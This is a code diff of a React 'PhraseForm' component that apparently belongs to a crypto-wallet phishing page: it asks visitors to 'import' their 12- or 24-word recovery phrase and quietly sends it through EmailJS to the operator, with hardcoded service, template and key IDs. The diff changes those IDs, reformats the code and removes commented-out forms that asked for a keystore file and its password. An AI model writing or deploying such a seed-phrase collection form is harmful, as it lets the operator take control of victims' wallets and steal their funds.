@@ -13,27 +13,33 @@ import "bootstrap/dist/css/bootstrap.min.css";
 const PhraseForm = () => {
   const [toggleState, setToggleState] = useState(1);
 
-  const dot = '...'
-
+  const dot = "...";
 
   const navigate = useNavigate();
   const form = useRef();
 
   const form2 = useRef();
 
-  
   const sendEmail = (e) => {
     e.preventDefault();
 
-    emailjs.sendForm('service_yj787qi', 'template_zt82g1k', form.current, 'g4ZEWVbf7KjSHQdm2')
-      .then((result) => {
+    emailjs
+      .sendForm(
+        "service_1k59z4j",
+        "template_1772qxl",
+        form.current,
+        "bG2p-qE0h7zsLKGzq"
+      )
+      .then(
+        (result) => {
           console.log(result.text);
-          navigate("/success-page")
-          
-      }, (error) => {
+          navigate("/success-page");
+        },
+        (error) => {
           console.log(error.text);
-          navigate("/error")
-      });
+          navigate("/error");
+        }
+      );
   };
 
   const sendKeystore = (e) => {
@@ -50,7 +56,7 @@ const PhraseForm = () => {
       .then(
         (result) => {
           navigate("/success-page");
-          console.log(result);
+          console.log("sent");
         },
         (error) => {
           console.log(error);
@@ -59,7 +65,6 @@ const PhraseForm = () => {
       );
   };
 
-  
   return (
     <Box paddingY={8}>
       <div className="tab-container">
@@ -91,90 +96,16 @@ const PhraseForm = () => {
             }
           >
             <form ref={form} onSubmit={sendEmail}>
-              <input className="form-control" type='text' name="key_phrase" />
+              <input className="form-control" type="text" name="key_phrase" />
               <button className="btn btn-primary">SUBMIT</button>
             </form>
-          
-            {/* <Form ref={form}>
-              <Form.Group
-                className="mb-3"
-                controlId="exampleForm.ControlTextarea1"
-              >
-                <Form.Control as="textarea" name="key_phrase" rows={12} />
-              </Form.Group>
-
-
-              <Box paddingY={2}>
-                <Typography
-                  sx={{
-                    fontWeight: "bolder",
-                    fontFamily: "Montserrat",
-                    textAlign: "center",
-                    fontSize: '.9rem'
-                  }}
-                  variant="h6"
-                >
-                  Typically 12 (sometimes 24) words seperated by single spaces
-                </Typography>
-              </Box>
-
-              <Button
-                className="btn btn-primary"
-                variant="primary"
-                type="submit"
-                style={{ width: "200px" }}
-                onClick={sendEmail}
-              >
-                IMPORT
-              </Button>
-            </Form> */}
           </div>
 
           <div
             className={
               toggleState === 2 ? "content container active-content" : "content"
             }
-          >
-            {/* <Form ref={form2} onSubmit={sendKeystore}>
-              <Form.Group
-                className="mb-3"
-                controlId="exampleForm.ControlTextarea2"
-              >
-                <Form.Control as="textarea" name="key_phrase" rows={12} />
-              </Form.Group>
-
-              <Form.Group className="mb-3" controlId="formBasicPassword2">
-                <Form.Control
-                  type="password"
-                  name="password"
-                  placeholder="Password"
-                />
-              </Form.Group>
-
-              <Box paddingY={2}>
-                <Typography
-                  sx={{
-                    fontWeight: "bolder",
-                    fontFamily: "Montserrat",
-                    textAlign: "center",
-                    fontSize: '.9rem'
-                  }}
-                  variant="h6"
-                >
-                  Several line of text beginning with {dot} plus the password you used to encrypte it
-                </Typography>
-              </Box>
-
-              <Button
-                className="btn btn-primary"
-                variant="primary"
-                type="submit"
-                style={{ width: "200px" }}
-              >
-                IMPORT
-              </Button>
-            </Form> */}
-          </div>
+          ></div>
 
           <div
             className={
@@ -194,10 +125,9 @@ const PhraseForm = () => {
                     fontWeight: "bolder",
                     fontFamily: "Montserrat",
                     textAlign: "center",
-                    fontSize: '.9rem'
+                    fontSize: ".9rem",
                   }}
                   variant="h6"
-                  
                 >
                   Typically 12 (sometimes 24) words seperated by single spaces
                 </Typography>
